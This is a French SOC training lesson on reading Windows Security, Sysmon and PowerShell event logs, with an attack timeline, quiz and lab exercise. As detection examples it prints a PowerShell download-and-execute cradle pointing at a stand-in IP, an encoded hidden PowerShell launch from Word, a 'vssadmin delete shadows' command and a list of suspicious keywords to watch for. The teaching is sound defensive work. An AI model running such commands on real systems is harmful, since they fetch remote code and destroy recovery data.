---
title: Les journaux d'événements Windows pour l'investigation
chapter: Preuves Windows
summary: Découvrez les événements Windows Security, Sysmon et PowerShell les plus utiles à un SOC, comment lire les types d'ouverture de session et les codes d'échec, et comment reconstituer les actions d'un attaquant à partir de séquences d'événements.
duration: 60
level: beginner
objectives:
- Localiser les principaux journaux d'événements Windows et expliquer ce que chacun enregistre
- Interpréter les événements 4624, 4625, 4672, 4688, 4720, 4732 et 1102, y compris les types d'ouverture de session et les codes d'état
- Décrire l'intérêt pour l'investigation des événements Sysmon 1, 3, 11 et 13 et de l'événement PowerShell 4104
- Reconstituer une séquence d'attaque à partir d'événements corrélés et identifier les lacunes de journalisation
prerequisites:
- TCP/IP, la poignée de main et le trafic suspect
---

## Introduction

Windows reste la plateforme de postes et de serveurs la plus répandue en entreprise, et ses journaux d'événements comptent parmi les sources de preuves les plus riches pour un SOC. Ils sont aussi bruyants et remplis de codes. Cette leçon se concentre sur le petit ensemble d'événements qui répondent à la plupart des questions d'investigation : *qui s'est connecté, d'où, comment, avec quels privilèges, et qu'a-t-il exécuté ?*

## Où se trouvent les journaux Windows

Les journaux d'événements sont stockés sous forme de fichiers `.evtx` dans `C:\Windows\System32\winevt\Logs\` et consultés avec l'Observateur d'événements (`eventvwr.msc`), PowerShell, ou transférés vers un SIEM.

| Journal | Contenu | Intérêt pour le SOC |
|---|---|---|
| **Security** | Ouvertures de session, usage de privilèges, modifications de comptes et de groupes, création de processus (si auditée), changements de stratégie | Le plus élevé — journal d'investigation principal |
| **System** | Services, pilotes, arrêts | L'installation de service (7045) est un indicateur de persistance |
| **Application** | Événements propres aux applications | Variable ; certains produits de sécurité y journalisent |
| **Microsoft-Windows-Sysmon/Operational** | Télémétrie détaillée processus, réseau, fichiers et registre (si Sysmon est installé) | Très élevé |
| **Microsoft-Windows-PowerShell/Operational** | Journalisation des blocs de script (4104) | Très élevé pour les attaques par script |
| **Microsoft-Windows-TaskScheduler/Operational** | Création/exécution de tâches planifiées | Persistance et exécution |

:::warning L'audit doit être activé
De nombreux événements précieux ne sont pas enregistrés par défaut. La création de processus (4688) exige *Auditer la création de processus*, et les lignes de commande exigent un paramètre de stratégie supplémentaire. La journalisation des blocs de script doit être activée par stratégie de groupe. **Un événement absent peut signifier « ne s'est pas produit » ou « n'était pas audité » — sachez toujours lequel.**
:::

## Le journal Security : événements essentiels

### 4624 — Ouverture de session réussie

L'événement le plus important à comprendre. Champs clés : `TargetUserName`, `TargetDomainName`, `LogonType`, `IpAddress`, `WorkstationName`, `LogonProcessName`, `AuthenticationPackageName`, `TargetLogonId`.

Les **types d'ouverture de session** indiquent *comment* elle a eu lieu :

| Type | Nom | Signification habituelle |
|---|---|---|
| 2 | Interactive | Clavier devant la console |
| 3 | Network | Accès à un partage ou authentification d'un outil distant (SMB, WinRM) |
| 4 | Batch | Tâche planifiée |
| 5 | Service | Service démarré sous un compte |
| 7 | Unlock | Déverrouillage du poste |
| 8 | NetworkCleartext | Identifiants envoyés en clair (par ex. authentification basique vers IIS) |
| 9 | NewCredentials | `runas /netonly` — souvent observé lors d'abus d'identifiants |
| 10 | RemoteInteractive | RDP / Terminal Services |
| 11 | CachedInteractive | Ouverture de session de domaine avec identifiants en cache (aucun DC joignable) |

Heuristiques d'investigation :

- **Type 10 depuis une IP source inattendue** → qui utilise RDP, et d'où ?
- **Type 3 depuis un poste vers de nombreux serveurs en quelques minutes** → possible mouvement latéral.
- **Type 9** sur un poste, surtout suivi d'accès réseau → possible usage d'identifiants pour un mouvement latéral (observé avec des outils de type « pass-the-hash »).

### 4625 — Échec d'ouverture de session

Champs clés : `TargetUserName`, `IpAddress`, `LogonType`, `Status` et `SubStatus`.

| SubStatus | Signification |
|---|---|
| `0xC000006A` | Mauvais mot de passe (le nom d'utilisateur est valide) |
| `0xC0000064` | Le nom d'utilisateur n'existe pas |
| `0xC0000234` | Compte verrouillé |
| `0xC0000072` | Compte désactivé |
| `0xC000006F` | Ouverture de session hors des heures autorisées |
| `0xC0000071` | Mot de passe expiré |

Un `0xC0000064` sur de nombreux noms différents suggère une **énumération de noms d'utilisateur** ; un `0xC000006A` répété pour un même nom suggère une **force brute** ; un ou deux échecs sur *de nombreux* noms valides depuis une même source suggèrent une **pulvérisation de mots de passe**.

### 4672 — Privilèges spéciaux attribués à une nouvelle session

Journalisé lorsqu'un compte disposant de privilèges équivalents à administrateur se connecte (par ex. `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`). Corrélez-le avec le 4624 via `SubjectLogonId`/`TargetLogonId`. Un 4672 pour un compte qui *ne devrait pas* être privilégié est un signal d'alarme.

### 4688 — Création d'un nouveau processus

Lorsqu'il est activé avec l'audit des lignes de commande, il enregistre `NewProcessName`, `CommandLine`, `ParentProcessName` et l'identifiant de session du créateur. C'est ainsi que l'on voit *ce qui a été exécuté*.

Exemple suspect :

```text
ParentProcessName: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
NewProcessName:    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine:       powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
```

Word qui lance une commande PowerShell encodée et masquée est un schéma classique de macro malveillante (ATT&CK **T1059.001**, **T1204.002**).

### Gestion des comptes et des groupes

| Événement | Signification |
|---|---|
| 4720 | Compte utilisateur créé |
| 4722 | Compte utilisateur activé |
| 4724 | Tentative de réinitialisation du mot de passe par un autre compte |
| 4728 / 4732 / 4756 | Membre ajouté à un groupe de sécurité global / local / universel |
| 4740 | Compte verrouillé |

Une création de compte inattendue (4720) suivie d'un ajout au groupe `Administrateurs` (4732) est une technique de persistance courante (ATT&CK **T1136**, **T1098**).

### 1102 — Le journal d'audit a été effacé

L'effacement du journal Security est rarement légitime en dehors d'une maintenance planifiée. Traitez le 1102 comme de gravité élevée (ATT&CK **T1070.001**). Les journaux transférés au SIEM *avant* l'effacement restent disponibles — une raison de plus de transférer rapidement.

### Autres événements utiles

- **4648** — Ouverture de session avec des identifiants explicites (`runas`, certains outils de mouvement latéral)
- **4768 / 4769 / 4771** — Demande de TGT Kerberos / demande de ticket de service / échec de pré-authentification (contrôleurs de domaine)
- **4776** — Validation d'identifiants NTLM (contrôleurs de domaine)
- **7045** (journal System) — Un service a été installé
- **4698** — Une tâche planifiée a été créée

## Sysmon : une télémétrie des postes haute fidélité

Sysmon (System Monitor, de la suite Microsoft Sysinternals) est un pilote et un service gratuits qui journalisent une activité détaillée selon un fichier de configuration. Des configurations communautaires répandues existent ; ajustez-les pour maîtriser le volume.

| ID Sysmon | Événement | Pourquoi c'est important |
|---|---|---|
| 1 | Création de processus (avec empreintes, parent, ligne de commande) | Plus riche que le 4688 ; inclut les empreintes des fichiers |
| 3 | Connexion réseau | Relie un processus à une IP/un port de destination |
| 7 | Chargement d'image | Détection du chargement latéral de DLL |
| 8 | CreateRemoteThread | Injection de processus |
| 10 | ProcessAccess | Accès à `lsass.exe` → extraction d'identifiants (T1003.001) |
| 11 | Création de fichier | Charges déposées, notes de rançon |
| 13 | Valeur de registre définie | Persistance via les clés Run (T1547.001) |
| 22 | Requête DNS | Quel processus a résolu quel domaine |

Les événements Sysmon 3 et 22 répondent à la question que les journaux réseau seuls ne peuvent pas trancher : **quel processus** a établi la connexion.

## Journalisation PowerShell

PowerShell est à la fois un outil d'administration essentiel et un outil favori des attaquants. Activez :

- La **journalisation des modules** (événement 4103) — détails d'exécution du pipeline
- La **journalisation des blocs de script** (événement **4104**) — le contenu réel du script, *après* désobfuscation des commandes encodées
- La **transcription** — des transcriptions texte des sessions vers un emplacement protégé

Exemple de contenu 4104 révélant un téléchargeur :

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')
```

Détectez des motifs comme `IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `-EncodedCommand`, `Net.WebClient`, `Invoke-WebRequest` combinés à une exécution, ainsi que les chaînes de contournement d'AMSI. Attendez-vous à des faux positifs issus de scripts d'administration légitimes ; construisez des listes d'autorisation selon le signataire, le chemin et le processus parent.

## Interroger les journaux sur un hôte

Lorsque vous disposez d'un accès autorisé à un hôte, PowerShell permet d'interroger directement les journaux :

```powershell
# Les 20 derniers échecs de connexion avec IP source et sous-état
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 20 |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    [pscustomobject]@{
      Time      = $_.TimeCreated
      User      = ($x.Event.EventData.Data | Where-Object Name -eq 'TargetUserName').'#text'
      SourceIP  = ($x.Event.EventData.Data | Where-Object Name -eq 'IpAddress').'#text'
      SubStatus = ($x.Event.EventData.Data | Where-Object Name -eq 'SubStatus').'#text'
    }
  }

# Connexions RDP (type 10) sur les dernières 24 heures
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=(Get-Date).AddDays(-1)} |
  Where-Object { $_.Properties[8].Value -eq 10 }
```

Dans un SIEM comme Microsoft Sentinel, les mêmes données s'interrogent en KQL dans la table `SecurityEvent` — c'est l'objet du module KQL.

## Reconstituer une séquence d'attaque

:::scenario Chronologie à partir d'événements Windows (hôte FS-01, heures UTC)
```text
01:52:10  4625  user=svc_backup  type=3  ip=10.0.9.77  sub=0xC000006A   (x38 en 4 min)
01:56:41  4624  user=svc_backup  type=3  ip=10.0.9.77
01:56:41  4672  user=svc_backup  privileges=SeBackupPrivilege, SeDebugPrivilege...
01:58:03  4688  parent=services.exe  new=C:\Windows\Temp\upd.exe
01:58:05  Sysmon 3  image=upd.exe  dst=198.51.100.77:443
02:03:17  4720  new account=helpdesk2   by=svc_backup
02:03:20  4732  helpdesk2 added to Administrators
02:10:44  4688  vssadmin.exe delete shadows /all /quiet
02:11:02  1102  Security log cleared  by=helpdesk2
```

**Lecture :** une attaque par force brute depuis l'hôte interne 10.0.9.77 réussit contre un compte de service privilégié ; un binaire est exécuté depuis `C:\Windows\Temp` et se connecte à un serveur externe (probablement un C2) ; un compte administrateur dérobé est créé ; les clichés instantanés sont supprimés (préparation d'un rançongiciel) ; et les journaux sont effacés pour entraver l'investigation. Comme les événements avaient été transférés au SIEM, l'effacement de 02:11 n'a pas fait disparaître cette chronologie.

**Actions immédiates :** isoler FS-01 et 10.0.9.77, désactiver `svc_backup` et `helpdesk2`, bloquer 198.51.100.77, préserver la mémoire et le disque si possible, et escalader en incident majeur.
:::

## Erreurs fréquentes

- **Lire un 4624 sans le type d'ouverture de session.** Une ouverture de type 5 (service) et une de type 10 (RDP) n'ont pas du tout le même sens.
- **Supposer que le champ `IpAddress` est toujours renseigné.** Les ouvertures locales affichent `-` ou `127.0.0.1`.
- **Ignorer les comptes machine** (noms se terminant par `$`). Ils sont généralement du bruit — mais pas toujours (par ex. attaques par relais).
- **Conclure « aucune preuve » alors que l'audit était désactivé.** Documentez les lacunes de journalisation comme des constats.
- **Considérer l'usage de PowerShell comme intrinsèquement malveillant.** C'est le contexte — processus parent, utilisateur, contenu du script, signataire — qui tranche.

## Implications de sécurité

- Déployez une stratégie d'audit de référence (ouvertures de session, gestion des comptes, création de processus avec ligne de commande, changements de stratégie) et Sysmon sur les serveurs et les postes à forte valeur.
- Transférez les journaux en quasi temps réel et protégez la chaîne de transfert.
- Alertez sur les 1102, les 4720/4732 inattendus et les applications Office qui lancent des interpréteurs de scripts.

## Vérification des connaissances

:::check Questions
1. Qu'indique une ouverture de session de type 10 ?
2. Un 4625 porte le SubStatus `0xC0000064`. Que vous apprend-il ?
3. Quel événement Sysmon relie un processus à une destination réseau ?
4. Pourquoi l'événement 4104 est-il plus utile que la présence de `-EncodedCommand` dans la ligne de commande d'un 4688 ?
:::

:::solution Réponses
1. Une ouverture **RemoteInteractive** — généralement RDP.
2. Le **nom d'utilisateur n'existe pas** — répété sur plusieurs noms, cela suggère une énumération de noms d'utilisateur.
3. L'**événement Sysmon 3** (connexion réseau).
4. Le 4104 enregistre le **contenu décodé du bloc de script**, ce qui permet de voir ce que la commande encodée faisait réellement.
:::

## Exercice

À partir de la chronologie du scénario ci-dessus :

1. Quelles techniques MITRE ATT&CK pouvez-vous identifier ? Donnez-en au moins quatre.
2. Quel événement unique utiliseriez-vous pour déterminer les privilèges exacts obtenus ?
3. Quelle lacune de journalisation aurait totalement masqué l'activité de 02:10:44 ?

:::solution Corrigé
1. **T1110** Brute Force (01:52) ; **T1078** Valid Accounts (01:56) ; **T1071** Application Layer Protocol / C2 (01:58) ; **T1136.001** Create Local Account et **T1098** Account Manipulation (02:03) ; **T1490** Inhibit System Recovery (02:10) ; **T1070.001** Clear Windows Event Logs (02:11).
2. Le **4672** — il liste les privilèges spéciaux attribués à la session.
3. Si l'**audit de la création de processus avec journalisation de la ligne de commande** (ou l'événement Sysmon 1) n'avait pas été activé, la commande `vssadmin` n'aurait pas été enregistrée.
:::

## Synthèse et prochaines étapes

- Le journal Security répond à qui, comment et avec quels privilèges ; les journaux Sysmon et PowerShell répondent à ce qui a été exécuté et où il s'est connecté.
- Les types d'ouverture de session et les codes de sous-état d'échec transforment des événements bruts en informations.
- Ce sont les séquences corrélées — et non les événements isolés — qui révèlent les attaques. Connaissez vos lacunes de journalisation.

Dans le module **KQL et ingénierie de détection**, vous transformerez ces événements en détections automatisées.

===assignment===
Sur une VM Windows de lab que vous contrôlez, activez *Auditer la création de processus* avec journalisation de la ligne de commande et la journalisation des blocs de script PowerShell. Effectuez trois actions anodines (ouvrir le Bloc-notes, exécuter `Get-Process` dans PowerShell, créer puis supprimer un utilisateur local de test). Exportez les événements obtenus (4688, 4104, 4720, 4726) et annotez chacun avec ce qu'il montre.

===criteria===
- Terminer la lecture, la vérification des connaissances et l'exercice.
- Marquer la leçon comme terminée ; le lab de force brute du module KQL s'appuie directement sur ces identifiants d'événements.

===references===
- Microsoft, *Auditer les événements d'ouverture de session* et référence de l'événement 4624 — https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624
- Microsoft, référence de l'événement 4625 — https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4625
- Microsoft Sysinternals, *Sysmon* — https://learn.microsoft.com/sysinternals/downloads/sysmon
- Microsoft, *about_Logging_Windows* (PowerShell) — https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging_windows
- MITRE ATT&CK T1070.001, Clear Windows Event Logs — https://attack.mitre.org/techniques/T1070/001/
